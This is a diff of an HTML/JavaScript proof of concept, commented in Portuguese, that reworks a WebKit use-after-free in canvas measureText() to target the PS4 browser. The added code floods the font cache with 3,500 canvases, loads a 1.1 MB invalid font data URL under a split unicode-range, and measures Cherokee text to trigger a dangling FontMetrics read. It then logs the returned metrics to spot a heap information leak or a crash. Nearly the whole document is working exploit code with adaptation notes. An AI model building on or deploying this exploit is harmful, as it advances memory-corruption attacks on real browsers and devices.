@@ -2,69 +2,201 @@
 <html>
 <head>
     <meta charset="utf-8">
-    <title>UAF PoC</title>
 </head>
 <body>
 <pre id="log">Iniciando...</pre>
 <script>
+// UAF em CanvasRenderingContext2DBase::measureTextInternal() — FontMetrics reference
+// Adaptado do commit WebKit 5ccd64b2ea725d032894737c2e673b3b8be18fef
+// rdar://187946124 / rdar://191051624
+//
+// MECANISMO:
+//   measureTextInternal() faz:
+//     (1) fontMetrics = fontProxy->metricsOfPrimaryFont()   <-- raw ref, ANTES de width()
+//     (2) fontProxy->width(textRun, ...)                    <-- glyph walk
+//           └─ fonte pendente carregada sincronamente (>= 1MB, excede threshold pre-warm)
+//                └─ font selector invalidation
+//                     └─ FontCascade re-keyed
+//                          └─ FontCascadeFonts antigo liberado (pruneUnreferencedEntries)
+//                               └─ fontMetrics DANGLING
+//     (3) emHeightAscentAndDescent(fontMetrics)             <-- UAF read
+//     (4) fontMetrics.xxx                                   <-- UAF reads
+//   Os valores corrompidos de (3)/(4) são retornados via TextMetrics ao JavaScript.
+//
+// DIFERENCA DO COMMIT 42b1e2a (CSSFontSelector):
+//   - Font GRANDE (>= 1MB) em vez de pequena — pula opportunisticallyStartFontDataURLLoading
+//   - Trigger via glyph walk em width() em vez de getter trap em face.then
+//   - UAF tipo READ (info leak) em vez de write — pode nao crashar imediatamente
+//   - Requer 3500 contextos dummy para atingir limiar de pruneUnreferencedEntries
+//
+// RISCO DE ADAPTACAO:
+//   No main thread, fontProxy->width() pode usar ExternalResourceDownloadPolicy::Forbid
+//   em vez de Allow. Se for Forbid, a fonte pendente NAO e carregada durante o glyph
+//   walk e o UAF nao e acionado. Verificar na secao de diagnostico abaixo.
+
 function log(msg) {
     document.getElementById('log').textContent = msg;
 }
 
-function loadFontAsDataURL(path) {
-    return fetch(path)
-        .then(function(r) {
-            if (!r.ok) throw new Error('HTTP ' + r.status);
-            return r.arrayBuffer();
-        })
-        .then(function(buffer) {
-            return new Promise(function(resolve, reject) {
-                var reader = new FileReader();
-                reader.onload  = function(e) { resolve(e.target.result); };
-                reader.onerror = reject;
-                reader.readAsDataURL(new Blob([buffer], { type: 'font/woff' }));
-            });
-        });
+// ---------------------------------------------------------------------------
+// Passo 1: Popular o FontCascadeCache com 3500 entradas unicas
+//
+// FontCascadeCache::pruneUnreferencedEntries() dispara a cada 1000 novas entradas.
+// O cache key embeds a versao do font selector, entao cada invalidacao de fonte
+// cria novas entradas. Precisamos que o limiar de 1000 seja cruzado DENTRO de
+// width() para que pruneUnreferencedEntries() libere o FontCascadeFonts que
+// contem o primaryFont referenciado por fontMetrics.
+//
+// Adaptacao: OffscreenCanvas(1,1) → document.createElement('canvas')
+//
+// AVISO: 3500 canvas DOM pode ser pesado para o PS4.
+// Se o browser travar antes do measureText(), reduzir para 1500 e testar.
+// ---------------------------------------------------------------------------
+log('Criando ' + 3500 + ' contextos dummy (pode demorar)...');
+
+var dummies = [];
+for (var i = 0; i < 3500; i++) {
+    var dummy = document.createElement('canvas');
+    dummy.width = 1;
+    dummy.height = 1;
+    var dummyCtx = dummy.getContext('2d');
+    // Familia unica por iteracao = nova entrada no FontCascadeCache
+    dummyCtx.font = '10px "dummy' + i + '"';
+    dummies.push(dummyCtx);
 }
 
-loadFontAsDataURL('resources/Ahem.woff')
-    .then(function(dataUrl) {
-        var face1 = new FontFace('testFace', 'url("' + dataUrl + '")');
-        var face2 = new FontFace('testFace', 'url("' + dataUrl + '")');
-        document.fonts.add(face1);
-        document.fonts.add(face2);
+// ---------------------------------------------------------------------------
+// Passo 2: Data URL de 1.1MB com dados invalidos
+//
+// POR QUE GRANDE?
+//   CSSFontFaceSource::opportunisticallyStartFontDataURLLoading() ignora fontes
+//   com data: URL acima de um certo threshold de tamanho. Isso mantem a fonte
+//   no estado PENDENTE ate que o glyph walk em width() a bombeie.
+//   'A'.repeat(1100000) = ~1.1MB de base64 invalido — o parse falha mas o
+//   evento de conclusao de carregamento e disparado de qualquer forma, e essa
+//   e a janela de reentrada que precisamos.
+//
+// POR QUE INVALIDO?
+//   O commit confirma: "the load itself is the reentrancy window; completion
+//   fires either way". Dados invalidos evitam dependencia de um arquivo .ttf real.
+// ---------------------------------------------------------------------------
+var pendingFontURL = 'url("data:font/ttf;base64,' + 'A'.repeat(1100000) + '")';
 
-        void face1.loaded;
-        void face2.loaded;
+log('Data URL criada (' + Math.round(pendingFontURL.length / 1024) + ' KB). Configurando faces...');
 
-        var trapFired = false;
-        var reenterFontFaceSet = function() {
-            trapFired = true;
-            document.fonts.add(new FontFace('unrelated', 'local("nonexistent")'));
-        };
-        Object.defineProperty(face1, 'then', { get: reenterFontFaceSet });
-        Object.defineProperty(face2, 'then', { get: reenterFontFaceSet });
+var keepAlive = [];
+var metricsLog = [];
 
-        var canvas = document.createElement('canvas');
-        canvas.width  = 10;
-        canvas.height = 10;
-        canvas.style.position = 'absolute';
-        canvas.style.left = '-9999px';
-        document.body.appendChild(canvas);
-        var context = canvas.getContext('2d');
+for (var attempt = 0; attempt < 2; attempt++) {
+    // metricsDonor: SEM unicode-range → cobre U+0020 (espaco) e todos os outros
+    // E a fonte que measureTextInternal() usa como primaryFont para obter FontMetrics.
+    // Quando o FontCascadeFonts e liberado, o Font deste face e destruido,
+    // deixando &fontMetrics como dangling reference.
+    var metricsDonor = new FontFace(
+        'metricsDonor' + attempt,
+        pendingFontURL
+    );
 
-        context.font = '10px Times, testFace';
-        context.measureText(String.fromCharCode(0x13A0));
+    // measured: unicode-range U+13A0-13FF (Cherokee)
+    // O glyph walk de width() encontra os caracteres Cherokee ('\u13A0\u13A2\u13A4')
+    // e tenta carregar ESTA fonte (pendente). O carregamento sincrono dispara
+    // font selector invalidation, que libera o FontCascadeFonts que contem metricsDonor.
+    //
+    // SPLIT DE unicode-range e crucial:
+    //   metricsDonor (sem range) → e o primaryFont (cobre U+0020/espaco)
+    //   measured (U+13A0-13FF)   → e bombeado pelo glyph walk dos chars Cherokee
+    var measured = new FontFace(
+        'measured' + attempt,
+        pendingFontURL,
+        { unicodeRange: 'U+13A0-13FF' }
+    );
 
-        if (trapFired) {
-            log('PASS: UAF acionado com sucesso.');
-        } else {
-            log('AVISO: Trap nao disparada.');
-        }
-    })
-    .catch(function(e) {
-        log('ERRO: ' + e.message);
+    document.fonts.add(metricsDonor);
+    document.fonts.add(measured);
+
+    // Canvas 64x64 no main thread
+    // Adaptacao: new OffscreenCanvas(64, 64) → document.createElement('canvas')
+    var canvas = document.createElement('canvas');
+    canvas.width = 64;
+    canvas.height = 64;
+    canvas.style.position = 'absolute';
+    canvas.style.left = '-9999px';
+    document.body.appendChild(canvas);
+    var context = canvas.getContext('2d');
+
+    // metricsDonor e a fonte primaria (sem unicode-range, aparece primeiro na cascata)
+    // measured e o fallback para Cherokee (U+13A0-13FF)
+    context.font = '10px metricsDonor' + attempt + ', measured' + attempt;
+    keepAlive.push(metricsDonor, measured, context);
+
+    // Sequencia de execucao em measureTextInternal() (versao vulneravel):
+    //
+    //   auto& font        = *fontProxy;
+    //   auto& fontMetrics = font.metricsOfPrimaryFont();    ← (A) bind de metricsDonor
+    //
+    //   float fontWidth = font.width('\u13A0\u13A2\u13A4'); ← (B) glyph walk
+    //     WidthIterator::advance() por caractere (CodePath::Simple — chars abaixo de U+1700)
+    //       → U+13A0: esta no range de measured → tenta carregar (pendente)
+    //         → ExternalResourceDownloadPolicy::Allow (Worker) / possivelmente Allow (PS4 main)
+    //           → carregamento sincrono → font selector invalidation
+    //             → FontCascade re-keyed → FontCascadeFonts antigo → pruneUnreferencedEntries
+    //               → metricsDonor destruido → &fontMetrics DANGLING
+    //
+    //   emHeightAscentAndDescent(protect(font.fontCascade()));  ← (C) usa fontMetrics dangling
+    //   auto& fontMetrics = ... (na versao corrigida, o bind seria aqui)
+    //   metrics->setActualBoundingBoxAscent(...)               ← (D) mais UAF reads
+    //
+    // POR QUE CHEROKEE (U+13A0)?
+    //   Abaixo de U+1700 → characterRangeCodePath() retorna CodePath::Simple
+    //   → WidthIterator caminha por caractere um a um → cada caractere pode
+    //   acionar o carregamento da fonte pendente individualmente
+    var metrics = context.measureText('\u13A0\u13A2\u13A4');
+
+    // Coletar valores de TextMetrics para diagnostico
+    // Se o UAF ocorreu, alguns destes valores podem ser anomalos (garbage de heap)
+    // Nota: pode nao crashar imediatamente — o UAF sao READS, nao writes
+    metricsLog.push({
+        attempt: attempt,
+        width: metrics.width,
+        actualBoundingBoxAscent:  metrics.actualBoundingBoxAscent,
+        actualBoundingBoxDescent: metrics.actualBoundingBoxDescent,
+        fontBoundingBoxAscent:    metrics.fontBoundingBoxAscent,
+        fontBoundingBoxDescent:   metrics.fontBoundingBoxDescent,
+        emHeightAscent:           metrics.emHeightAscent,
+        emHeightDescent:          metrics.emHeightDescent
     });
+}
+
+// ---------------------------------------------------------------------------
+// Diagnostico: exibir os valores de TextMetrics
+//
+// Se o UAF ocorreu no main thread:
+//   - Os valores de metrics podem ser anomalos (NaN, Infinity, numeros absurdos)
+//   - Ou o PS4 pode crashar antes de chegar aqui (UAF read de pagina nao mapeada)
+//
+// Se os valores sao normais e o PS4 nao crashou:
+//   - ExternalResourceDownloadPolicy no main thread e provavelmente Forbid
+//   - O trigger nao funciona no main thread para esta versao do bug
+//   - Nesse caso, tentar a Opcao 1 com transferControlToOffscreen() (se disponivel)
+// ---------------------------------------------------------------------------
+var output = 'measureText() completou para ambas as tentativas.\n\n';
+for (var k = 0; k < metricsLog.length; k++) {
+    var m = metricsLog[k];
+    output += '--- attempt ' + m.attempt + ' ---\n';
+    output += 'width:                    ' + m.width + '\n';
+    output += 'actualBoundingBoxAscent:  ' + m.actualBoundingBoxAscent + '\n';
+    output += 'actualBoundingBoxDescent: ' + m.actualBoundingBoxDescent + '\n';
+    output += 'fontBoundingBoxAscent:    ' + m.fontBoundingBoxAscent + '\n';
+    output += 'fontBoundingBoxDescent:   ' + m.fontBoundingBoxDescent + '\n';
+    output += 'emHeightAscent:           ' + m.emHeightAscent + '\n';
+    output += 'emHeightDescent:          ' + m.emHeightDescent + '\n\n';
+}
+output += 'Verificar:\n';
+output += '  - Valores anomalos (NaN, Infinity, numeros absurdos) = UAF acionado\n';
+output += '  - Crash antes desta mensagem = UAF acionado (read em pagina invalida)\n';
+output += '  - Valores normais e sem crash = ExternalResourceDownloadPolicy::Forbid\n';
+output += '    no main thread desta versao do PS4 WebKit — bug nao atingivel sem Worker.';
+log(output);
 </script>
 </body>
 </html>
